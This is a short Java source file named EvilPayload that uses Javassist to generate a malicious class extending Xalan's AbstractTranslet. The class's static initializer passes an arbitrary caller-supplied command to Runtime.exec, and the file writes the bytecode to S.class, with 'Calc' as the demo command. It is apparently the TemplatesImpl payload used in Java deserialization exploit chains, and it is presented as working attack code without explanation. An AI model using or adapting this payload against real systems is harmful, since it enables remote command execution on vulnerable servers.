package javassist;

import java.io.File;
import java.io.FileOutputStream;

public class EvilPayload {

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }


    public static void writeShell() throws Exception {
        byte[] shell = EvilPayload.getTemplatesImpl("Calc");
        FileOutputStream fileOutputStream = new FileOutputStream(new File("S.class"));
        fileOutputStream.write(shell);
    }

    public static void main(String[] args) throws Exception {
        writeShell();
    }
}
